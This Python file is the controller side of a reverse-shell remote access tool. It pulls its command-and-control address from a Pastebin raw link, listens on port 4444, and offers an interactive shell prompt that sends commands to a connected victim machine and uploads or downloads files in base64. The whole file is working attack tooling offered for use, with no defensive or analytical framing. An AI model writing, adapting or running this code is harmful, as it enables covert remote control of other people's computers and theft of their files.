import socket 
import json
import base64
import shlex
import requests

def fetch_c2_ip():
    try:
        # Replace this with your actual Pastebin or GitHub Gist RAW link
        url = "https://pastebin.com/raw/DjTikqsH"
        response = requests.get(url, timeout=5)
        return response.text.strip()
    except:
        return "Server down for pastebin"  # Fallback if config server is unreachable

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a socket object
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Set the socket options
        listener.bind((ip, port))  # Bind the IP and port
        listener.listen(0)  # Listen for incoming connections
        print("\n[+] Waiting for incoming connection\n")
        self.connection, address = listener.accept()  # This command basically gives 2 different values
        print("\n[+] Connection established from" + str(address))  # Print the connection details


    def reliable_send(self, data):
        json_data = json.dumps(data).encode()
        length = len(json_data).to_bytes(4, byteorder='big')
        self.connection.send(length + json_data)


    def reliable_receive(self):
        raw_length = self._recvall(4)
        if raw_length is None:
            return None
        message_length = int.from_bytes(raw_length, byteorder='big')
        json_data = self._recvall(message_length)
        return json.loads(json_data.decode())
    
    def _recvall(self, length):
        data = b""
        while len(data) < length:
            try:
                packet = self.connection.recv(length - len(data))
                if not packet:
                    return None
                data += packet
            except socket.error:
                return None
        return data


    def execute_remotely(self, command):
        self.reliable_send(command)  # Send the command to the target machine
        if command[0] == "exit":
            self.connection.close()
            print("\n[!] Connection closed")
            exit()
        return self.reliable_receive()  # Receive the result from the target machine
    

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # Write the content to the file
        return "[+] Download successful"
        

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()  # Read the file and return the content


    def run(self):
        while True:
            command = input(f"\nShell >> ")  # Get the command from the user
            try:
                command = shlex.split(command)  # Split the command into a list
            except ValueError as e:
                print(f"[!] Invalid command syntax: {e}")
                continue

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])  # Read the file
                    command.append(file_content)  # Append the file content to the command

                result = self.execute_remotely(command)

                if command[0] == "download" and isinstance(result, str) and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command executionnnn" # If there is an error, print this message    
            
            print(result)  # Print the result

try:
    my_listener = Listener(fetch_c2_ip(), 4444)
    my_listener.run()
except KeyboardInterrupt:
    print("\n[!] Listener terminated by user.")
    try:
        my_listener.connection.close()
    except:
        pass
    exit()